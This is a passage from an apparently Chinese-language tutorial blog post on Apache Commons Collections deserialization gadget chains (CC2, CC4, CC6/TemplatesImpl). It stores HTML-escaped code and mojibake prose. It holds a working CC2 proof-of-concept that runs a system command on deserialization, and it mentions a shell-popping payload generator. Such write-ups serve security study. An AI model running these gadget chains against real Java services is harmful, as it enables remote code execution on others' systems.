&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">ByteSource&lt;/span> &lt;span style="color:#111">ciphertext&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">aes&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">encrypt&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">payloads&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">key&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">printf&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">ciphertext&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">toString&lt;/span>&lt;span style="color:#f92672">());&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>ç”±äºŽæˆ‘åœ¨Linuxä¸Šæµ‹è¯•ï¼Œå°±ä¸å¼¹è®¡ç®—å™¨ï¼Œç›´æŽ¥å¼¹shell&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220302030308598.png" alt="image-20220302030308598">&lt;/p>
&lt;p>æ•ˆæžœæ‹”ç¾¤ï¼ï¼ï¼ï¼ï¼ï¼&lt;/p>
&lt;p>è¿™ä¸€èŠ‚æˆ‘ä»¬å°†&lt;code>TemplatesImpl&lt;/code>å’ŒCC6ç»“åˆåœ¨ä¸€èµ·ï¼ŒåŒæ—¶è§£å†³äº†CC3é«˜ç‰ˆæœ¬åˆ©ç”¨ä¸äº†çš„é—®é¢˜&lt;/p>
&lt;h2 id="cc2---cc4">CC2 - cc4&lt;/h2>
&lt;p>CCååºåˆ—åŒ–åˆ©ç”¨é“¾è¢«æå‡ºæ—¶ï¼Œccä¾èµ–æœ‰ä»¥ä¸‹ä¸¤ä¸ªç‰ˆæœ¬ï¼ŒgroupIdå’ŒartifactIdéƒ½ä¸ä¸€æ ·&lt;/p>
&lt;ul>
&lt;li>commons-collections:commons-collections&lt;/li>
&lt;li>org.apache.commons:commons-collection4&lt;/li>
&lt;/ul>
&lt;p>è¡¨çŽ°åœ¨æˆ‘ä»¬æž„é€ expçš„åŒºåˆ«æ˜¯å°†&lt;code>decorate&lt;/code>æ”¹ä¸ºäº†&lt;code>LazyMap&lt;/code>&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#111">Map&lt;/span> &lt;span style="color:#75af00">decorate&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Map&lt;/span> &lt;span style="color:#111">map&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">Transformer&lt;/span> &lt;span style="color:#111">factory&lt;/span>&lt;span style="color:#f92672">){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">LazyMap&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">map&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">factory&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#f92672">&amp;lt;&lt;/span>&lt;span style="color:#111">V&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">K&lt;/span>&lt;span style="color:#f92672">&amp;gt;&lt;/span> &lt;span style="color:#111">LazyMap&lt;/span>&lt;span style="color:#f92672">&amp;lt;&lt;/span>&lt;span style="color:#111">K&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">V&lt;/span>&lt;span style="color:#f92672">&amp;gt;&lt;/span> &lt;span style="color:#75af00">LazyMap&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">final&lt;/span> &lt;span style="color:#111">Map&lt;/span>&lt;span style="color:#f92672">&amp;lt;&lt;/span>&lt;span style="color:#111">K&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">V&lt;/span>&lt;span style="color:#f92672">&amp;gt;&lt;/span> &lt;span style="color:#111">map&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#00a8c8">final&lt;/span> &lt;span style="color:#111">Transformer&lt;/span>&lt;span style="color:#f92672">&amp;lt;?&lt;/span> &lt;span style="color:#00a8c8">super&lt;/span> &lt;span style="color:#111">K&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#f92672">?&lt;/span> &lt;span style="color:#00a8c8">extends&lt;/span> &lt;span style="color:#111">V&lt;/span>&lt;span style="color:#f92672">&amp;gt;&lt;/span> &lt;span style="color:#111">factory&lt;/span>&lt;span style="color:#f92672">){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">LazyMap&lt;/span>&lt;span style="color:#f92672">&amp;lt;&lt;/span>&lt;span style="color:#111">K&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">V&lt;/span>&lt;span style="color:#f92672">&amp;gt;(&lt;/span>&lt;span style="color:#111">map&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">factory&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>ç›´æŽ¥æŠŠgadgetæ”¹ä¸€ä¸‹åå­—å³å¯ï¼›ä¸è¿‡ä¸ºäº†ä¸“é—¨é€‚é…cc4ï¼Œysoserialä¹Ÿæœ‰ä¸“é—¨çš„é“¾å­CC2å’ŒCC4&lt;/p>
&lt;p>ccåŒ…ä¹‹æ‰€ä»¥èƒ½æ‰¾å‡ºè¿™ä¹ˆå¤šé“¾å­ï¼Œé™¤äº†ç›¸å½“åŸºç¡€ä»¥å¤–ï¼Œæ›´å¤šçš„åŽŸå› åœ¨äºŽå®ƒåŒ…å«äº†å¾ˆå¤šå¯ä»¥æ‰§è¡Œä»»æ„æ–¹æ³•çš„Transformerï¼Œæ‰€ä»¥æ‰¾é“¾å­çš„è¿‡ç¨‹ç›¸å½“äºŽæ‰¾ä¸€æ¡ä»Ž&lt;code>Serializable#readObject&lt;/code>åˆ°&lt;code>Transformer#transform&lt;/code>æ–¹æ³•çš„è°ƒç”¨é“¾&lt;/p>
&lt;p>æˆ‘ä»¬åˆ†æžä¸€ä¸‹CC2ï¼Œå®ƒç”¨åˆ°çš„å…³é”®ç±»æœ‰&lt;code>java.util.PriorityQueue&lt;/code>å’Œ&lt;code>org.apache.commons.collections4.comparators.TransformingComparator&lt;/code>ï¼ˆå¯é€šè¿‡comprareè°ƒç”¨transformï¼‰&lt;/p>
&lt;p>&lt;code>java.util.PriorityQueue&lt;/code>é‡å†™äº†&lt;code>readObject&lt;/code>æ–¹æ³•&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">readObject&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">java&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">io&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">ObjectInputStream&lt;/span> &lt;span style="color:#111">s&lt;/span>&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">java&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">io&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">IOException&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">ClassNotFoundException&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// Read in size, and any hidden stuff
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">s&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">defaultReadObject&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// Read in (and discard) array length
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">s&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">readInt&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">SharedSecrets&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getJavaOISAccess&lt;/span>&lt;span style="color:#f92672">().&lt;/span>&lt;span style="color:#75af00">checkArray&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">s&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">Object&lt;/span>&lt;span style="color:#f92672">[].&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">size&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">queue&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Object&lt;/span>&lt;span style="color:#f92672">[&lt;/span>&lt;span style="color:#111">size&lt;/span>&lt;span style="color:#f92672">];&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// Read in all elements.
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#111">i&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">0&lt;/span>&lt;span style="color:#f92672">;&lt;/span> &lt;span style="color:#111">i&lt;/span> &lt;span style="color:#f92672">&amp;lt;&lt;/span> &lt;span style="color:#111">size&lt;/span>&lt;span style="color:#f92672">;&lt;/span> &lt;span style="color:#111">i&lt;/span>&lt;span style="color:#f92672">++)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">queue&lt;/span>&lt;span style="color:#f92672">[&lt;/span>&lt;span style="color:#111">i&lt;/span>&lt;span style="color:#f92672">]&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">s&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">readObject&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// Elements are guaranteed to be in &amp;#34;proper order&amp;#34;, but the
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75715e">// spec has never explained what that might be.
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">heapify&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;pre tabindex="0">&lt;code>heapify-&amp;gt; siftDown-&amp;gt; siftDownUsingComparator-&amp;gt; comparator.compare-&amp;gt; TransformingComparator-&amp;gt; compare-&amp;gt; transform
&lt;/code>&lt;/pre>&lt;p>æž„é€ poc&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.io.ByteArrayInputStream&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.io.ByteArrayOutputStream&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.io.ObjectInputStream&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.io.ObjectOutputStream&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.lang.reflect.Field&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.util.Comparator&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.util.PriorityQueue&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">org.apache.commons.collections4.Transformer&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">org.apache.commons.collections4.functors.ChainedTransformer&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">org.apache.commons.collections4.functors.ConstantTransformer&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">org.apache.commons.collections4.functors.InvokerTransformer&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">org.apache.commons.collections4.comparators.TransformingComparator&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">CC2&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">Exception&lt;/span>&lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Transformer&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">fakeTransformers&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Transformer&lt;/span>&lt;span style="color:#f92672">[]{&lt;/span>&lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">ConstantTransformer&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">1&lt;/span>&lt;span style="color:#f92672">)};&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Transformer&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">transformers&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Transformer&lt;/span>&lt;span style="color:#f92672">[]{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">ConstantTransformer&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Runtime&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">),&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">InvokerTransformer&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;getMethod&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Class&lt;/span>&lt;span style="color:#f92672">[]{&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">Class&lt;/span>&lt;span style="color:#f92672">[].&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">},&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Object&lt;/span>&lt;span style="color:#f92672">[]{&lt;/span>&lt;span style="color:#d88200">&amp;#34;getRuntime&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Class&lt;/span>&lt;span style="color:#f92672">[&lt;/span>&lt;span style="color:#111">0&lt;/span>&lt;span style="color:#f92672">]}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">),&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">InvokerTransformer&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;invoke&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Class&lt;/span>&lt;span style="color:#f92672">[]{&lt;/span>&lt;span style="color:#111">Object&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">Object&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">},&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Object&lt;/span>&lt;span style="color:#f92672">[]{&lt;/span>&lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Object&lt;/span>&lt;span style="color:#f92672">[&lt;/span>&lt;span style="color:#111">0&lt;/span>&lt;span style="color:#f92672">]}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">),&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">InvokerTransformer&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;exec&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Class&lt;/span>&lt;span style="color:#f92672">[]{&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">},&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[]{&lt;/span>&lt;span style="color:#d88200">&amp;#34;calc.exe&amp;#34;&lt;/span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">),&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">ConstantTransformer&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">1&lt;/span>&lt;span style="color:#f92672">),&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">};&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Transformer&lt;/span> &lt;span style="color:#111">transformerChain&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">ChainedTransformer&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">fakeTransformers&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Comparator&lt;/span> &lt;span style="color:#111">comparator&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">TransformingComparator&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">transformerChain&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">PriorityQueue&lt;/span> &lt;span style="color:#111">queue&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">PriorityQueue&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">2&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">comparator&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">queue&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">add&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">1&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">queue&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">add&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">2&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">setFieldValue&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">transformerChain&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;iTransformers&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">transformers&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">ByteArrayOutputStream&lt;/span> &lt;span style="color:#111">barr&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">ByteArrayOutputStream&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">ObjectOutputStream&lt;/span> &lt;span style="color:#111">oos&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">ObjectOutputStream&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">barr&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">oos&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">writeObject&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">queue&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">oos&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">close&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">barr&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">ObjectInputStream&lt;/span> &lt;span style="color:#111">ois&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">ObjectInputStream&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">ByteArrayInputStream&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">barr&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">toByteArray&lt;/span>&lt;span style="color:#f92672">()));&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Object&lt;/span> &lt;span style="color:#111">o&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Object&lt;/span>&lt;span style="color:#f92672">)&lt;/span>&lt;span style="color:#111">ois&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">readObject&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
